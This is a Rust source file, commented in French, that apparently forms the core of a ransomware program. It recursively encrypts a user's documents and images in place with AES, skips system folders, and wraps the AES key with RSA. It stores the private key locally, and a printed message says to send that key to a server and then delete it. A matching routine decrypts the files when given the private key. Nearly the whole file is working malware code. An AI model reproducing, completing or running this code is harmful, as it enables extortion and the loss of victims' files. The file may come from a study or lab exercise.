use std::env;
use std::path::Path;
use std::path::PathBuf;

use crate::aes;
use crate::aes::SecureAes;
use crate::file;
use crate::simple_rsa;
use rsa::{RsaPrivateKey, RsaPublicKey};

pub fn bytes_to_string(bytes: Vec<u8>) -> String {
    String::from_utf8(bytes).unwrap()
}

pub fn bytes_to_string_lossy(bytes: &[u8]) -> String {
    String::from_utf8_lossy(bytes).to_string()
}

pub async fn setup_encryption(directory: &str) -> Result<(), Box<dyn std::error::Error>> {
    let paths = get_user_paths()?;
    println!("Utilisateur détecté: {}", paths.username);

    let aes_key = aes::SecureAes::generate_key();
    println!("Clé AES générée");

    let rsa_private_key = simple_rsa::generate_private_key(2048);
    let rsa_public_key = RsaPublicKey::from(&rsa_private_key);
    println!("Paire de clés RSA générée");

    let cypher = aes::SecureAes::new(&aes_key);

    let excluded_dirs = vec![
        paths.temp_marginal.as_str(),
        paths.temp_marginal_private.as_str(),
        "C:\\Windows\\System32",
        "C:\\Program Files",
        "C:\\Program Files (x86)",
    ];

    let files = file::find_files_by_extensions_recursive_with_exclusions(
        directory,
        &[
            ".txt", ".pdf", ".docx", ".xlsx", ".ods", ".png", ".jpg", ".jpeg",
        ],
        &excluded_dirs,
    )?;

    println!("Chiffrement de {} fichiers...", files.len());
    encrypt_files(&files, &cypher).await;

    let encrypted_aes_key = encrypt_aes_key_with_public_key(&rsa_public_key, &aes_key)?;
    println!("Clé AES chiffrée avec RSA");

    store_keys(&rsa_public_key, &rsa_private_key, &encrypted_aes_key).await?;

    println!("Tous les fichiers ont été chiffrés !");
    println!("La clé privée est temporairement stockée dans C:\\temp\\marginal_private\\");
    println!("⚠️ Envoyez cette clé privée au serveur puis supprimez-la de la machine !");

    Ok(())
}

fn encrypt_aes_key_with_public_key(
    public_key: &RsaPublicKey,
    aes_key: &[u8; 32],
) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    use rand::thread_rng;
    use rsa::Pkcs1v15Encrypt;

    let mut rng = thread_rng();
    let encrypted_key = public_key.encrypt(&mut rng, Pkcs1v15Encrypt, aes_key)?;

    Ok(encrypted_key)
}

async fn store_keys(
    public_key: &RsaPublicKey,
    private_key: &RsaPrivateKey,
    encrypted_aes_key: &[u8],
) -> Result<(), Box<dyn std::error::Error>> {
    let key_dir = Path::new("C:\\temp\\marginal");
    let private_key_dir = Path::new("C:\\temp\\marginal_private");

    // Sérialiser les clés au format PEM
    use rsa::pkcs1::{EncodeRsaPrivateKey, EncodeRsaPublicKey};
    let private_key_pem = private_key.to_pkcs1_pem(rsa::pkcs1::LineEnding::LF)?;
    let public_key_pem = public_key.to_pkcs1_pem(rsa::pkcs1::LineEnding::LF)?;

    // Stocker dans /temp/marginal (accessible pour le déchiffrement)
    file::force_write_in(key_dir.join("public_key"), public_key_pem.as_bytes())?;
    file::force_write_in(key_dir.join("encrypted_aes_key"), encrypted_aes_key)?;

    // Stocker temporairement la clé privée dans /temp/marginal_private
    file::force_write_in(
        private_key_dir.join("private_key"),
        private_key_pem.as_bytes(),
    )?;

    println!("Clés stockées:");
    println!("- Clé publique RSA: C:\\temp\\marginal\\public_key");
    println!("- Clé AES chiffrée: C:\\temp\\marginal\\encrypted_aes_key");
    println!("- Clé privée RSA (temporaire): C:\\temp\\marginal_private\\private_key");

    Ok(())
}

pub fn get_private_key_from_path<P: AsRef<Path>>(
    path: P,
) -> Result<RsaPrivateKey, Box<dyn std::error::Error>> {
    let private_key_pem = file::read_file(path)?;
    let private_key_str = String::from_utf8(private_key_pem)?;

    use rsa::pkcs1::DecodeRsaPrivateKey;
    let rsa_private_key = rsa::RsaPrivateKey::from_pkcs1_pem(&private_key_str)?;

    Ok(rsa_private_key)
}

async fn encrypt_files(files: &Vec<PathBuf>, cypher: &SecureAes) {
    for file in files.iter() {
        let file_content = match file::read_file(Path::new(file)) {
            Ok(data) => data,
            Err(err) => {
                println!("Erreur lecture fichier {:?}: {:?}", file, err);
                continue;
            }
        };

        let encrypted_content = match cypher.encrypt(&file_content) {
            Ok(data) => data,
            Err(err) => {
                println!("Erreur chiffrement fichier {:?}: {:?}", file, err);
                continue;
            }
        };

        match file::write_in(file, &encrypted_content) {
            Ok(()) => {
                println!("Fichier {:?} chiffré avec succès", file);
            }
            Err(err) => {
                println!("Erreur écriture fichier {:?}: {:?}", file, err);
            }
        };
    }
}

pub async fn decrypt_with_private_key(
    private_key: &RsaPrivateKey,
    target_directory: Option<&str>,
) -> Result<(), Box<dyn std::error::Error>> {
    let key_dir = Path::new("C:\\temp\\marginal");
    let encrypted_aes_key_file = key_dir.join("encrypted_aes_key");

    if !encrypted_aes_key_file.exists() {
        return Err("Aucune clé AES chiffrée trouvée. Les fichiers n'ont pas été chiffrés.".into());
    }

    // Lire la clé AES chiffrée
    let encrypted_aes_key = file::read_file(&encrypted_aes_key_file)?;

    // Déchiffrer la clé AES avec la clé privée RSA
    let aes_key_bytes = simple_rsa::decrypt(private_key, encrypted_aes_key);

    if aes_key_bytes.len() != 32 {
        return Err("La clé AES déchiffrée n'a pas la bonne taille".into());
    }

    let mut aes_key = [0u8; 32];
    aes_key.copy_from_slice(&aes_key_bytes);

    let cypher = aes::SecureAes::new(&aes_key);

    // Déterminer le répertoire à déchiffrer
    let directory = target_directory.unwrap_or("C:\\");

    let excluded_dirs = vec![
        "C:\\temp\\marginal",
        "C:\\temp\\marginal_private",
        "C:\\Windows\\System32",
        "C:\\Program Files",
    ];

    let files = file::find_files_by_extensions_recursive_with_exclusions(
        directory,
        &[
            ".txt", ".pdf", ".docx", ".xlsx", ".ods", ".png", ".jpg", ".jpeg",
        ],
        &excluded_dirs,
    )?;

    println!("Déchiffrement de {} fichiers...", files.len());
    decrypt_files(&files, &cypher).await;

    println!("Tous les fichiers ont été déchiffrés !");

    Ok(())
}

async fn decrypt_files(files: &Vec<PathBuf>, cypher: &SecureAes) {
    let mut success_count = 0;
    let mut error_count = 0;

    for file in files.iter() {
        // Vérifiez d'abord si le fichier semble chiffré
        if !is_file_encrypted(file) {
            println!("Fichier {:?} ne semble pas chiffré, ignoré", file);
            continue;
        }

        let file_content = match file::read_file(Path::new(file)) {
            Ok(data) => data,
            Err(err) => {
                println!("Erreur lecture fichier {:?}: {:?}", file, err);
                error_count += 1;
                continue;
            }
        };

        let decrypted_content = match cypher.decrypt(&file_content) {
            Ok(data) => data,
            Err(err) => {
                println!("Erreur déchiffrement fichier {:?}: {:?}", file, err);
                error_count += 1;
                continue;
            }
        };

        match file::write_in(file, &decrypted_content) {
            Ok(()) => {
                println!("Fichier {:?} déchiffré avec succès", file);
                success_count += 1;
            }
            Err(err) => {
                println!("Erreur écriture fichier {:?}: {:?}", file, err);
                error_count += 1;
            }
        };
    }

    println!(
        "Résumé: {} fichiers déchiffrés avec succès, {} erreurs",
        success_count, error_count
    );
}

pub async fn decrypt_with_private_key_from_path<P: AsRef<Path>>(
    private_key_path: P,
    target_directory: Option<&str>,
) -> Result<(), Box<dyn std::error::Error>> {
    let private_key = get_private_key_from_path(private_key_path)?;
    decrypt_with_private_key(&private_key, target_directory).await
}

pub fn is_file_encrypted(file_path: &Path) -> bool {
    match file::read_file(file_path) {
        Ok(data) => {
            // Un fichier chiffré par votre système aura au minimum :
            // - 12 bytes de nonce
            // - 16 bytes de tag GCM
            // - au moins quelques bytes de données
            if data.len() < 28 {
                return false;
            }

            // Vérification basique : les fichiers PDF commencent par "%PDF"
            // Si on trouve cette signature, le fichier n'est pas chiffré
            if data.starts_with(b"%PDF") {
                return false;
            }

            // Pour être plus sûr, on pourrait essayer de déchiffrer avec une clé test
            // mais c'est plus complexe
            true
        }
        Err(_) => false,
    }
}

pub struct UserPaths {
    pub username: String,
    pub user_profile: String,
    pub desktop: String,
    pub temp_marginal: String,
    pub temp_marginal_private: String,
}
impl UserPaths {
    pub fn get_target_directory(&self) -> String {
        format!("{}\\appart2", self.desktop)
    }

    pub fn get_private_key_path(&self) -> String {
        format!("{}\\private_key", self.temp_marginal_private)
    }

    pub fn get_encrypted_aes_key_path(&self) -> String {
        format!("{}\\encrypted_aes_key", self.temp_marginal)
    }

    pub fn get_public_key_path(&self) -> String {
        format!("{}\\public_key", self.temp_marginal)
    }
}

pub fn get_user_paths() -> Result<UserPaths, Box<dyn std::error::Error>> {
    let username = env::var("USERNAME")
        .or_else(|_| env::var("USER"))
        .map_err(|_| "Impossible de déterminer le nom d'utilisateur")?;

    let user_profile =
        env::var("USERPROFILE").map_err(|_| "Impossible de déterminer le profil utilisateur")?;

    Ok(UserPaths {
        username,
        user_profile,
        desktop: format!("{}\\Desktop", env::var("USERPROFILE")?),
        temp_marginal: "C:\\temp\\marginal".to_string(),
        temp_marginal_private: "C:\\temp\\marginal_private".to_string(),
    })
}
